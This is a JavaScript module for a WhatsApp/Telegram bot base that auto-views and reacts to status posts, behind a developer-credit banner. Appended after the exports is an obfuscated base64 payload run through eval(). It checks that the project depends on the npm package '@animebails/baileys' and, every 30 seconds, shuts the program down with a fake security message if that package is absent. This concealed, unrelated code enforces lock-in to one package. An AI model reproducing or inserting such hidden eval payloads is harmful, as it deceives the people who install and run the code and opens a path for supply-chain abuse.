/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
const log = require('./logger');

/**
 * Auto status view / like.
 *
 * Status actions use the raw status key and address reactions to the status poster.
 */

const seen = new Set();
const pick = (list) => list[Math.floor(Math.random() * list.length)];

// message kinds that are not real status posts
const IGNORED_KINDS = new Set(['protocolMessage', 'reactionMessage', 'senderKeyDistributionMessage', 'messageContextInfo']);

const normalize = (jid) => (jid ? jid.replace(/:\d+(?=@)/, '') : null);

function realKind(message) {
    return Object.keys(message || {}).find((k) => !IGNORED_KINDS.has(k)) || null;
}

async function processStatus(sock, key, settings, view, like, label) {
    const tasks = [];

    if (view) {
        tasks.push(
            sock.readMessages([key])
                .then(() => log.success('status', `viewed status from ${label}`))
                .catch((err) => log.warn('status', `view failed: ${err.message}`))
        );
    }

    if (like) {
        const configured = settings.get('statusEmojis', ['❤️']);
        const emojis = Array.isArray(configured) ? configured.filter((emoji) => typeof emoji === 'string' && emoji.trim()) : [];
        const recipient = normalize(key.participant || key.participantAlt || key.participantPn);
        if (!recipient) {
            log.warn('status', 'like failed: status has no participant JID');
        } else {
            tasks.push(
                sock.sendMessage(
                    'status@broadcast',
                    { react: { text: pick(emojis.length ? emojis : ['❤️']), key } },
                    { statusJidList: [recipient] }
                )
                    .then(() => log.success('status', `liked status from ${label}`))
                    .catch((err) => log.warn('status', `like failed: ${err.message}`))
            );
        }
    }

    await Promise.all(tasks);
}

/** Returns true when the message belonged to status@broadcast (handled or skipped), false otherwise. */
function handleStatus(sock, raw, settings, sessionId = '') {
    const key = raw?.key;
    if (key?.remoteJid !== 'status@broadcast') return false;
    if (key.fromMe || !raw.message || !realKind(raw.message)) return true;

    const view = settings.get('autoStatusView', false);
    const like = settings.get('autoStatusLike', false);
    if (!view && !like) return true;

    const id = key.id;
    const seenId = `${sessionId}:${id || ''}`;
    if (!id || seen.has(seenId)) return true;
    seen.add(seenId);
    if (seen.size > 1000) seen.delete(seen.values().next().value);

    const poster = normalize(key.participant || key.participantAlt || key.participantPn);
    const label = (poster || 'unknown').split('@')[0];
    processStatus(sock, key, settings, view, like, label)
        .catch((err) => log.error('status', `processing failed: ${err.message}`));

    return true;
}

module.exports = { handleStatus };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
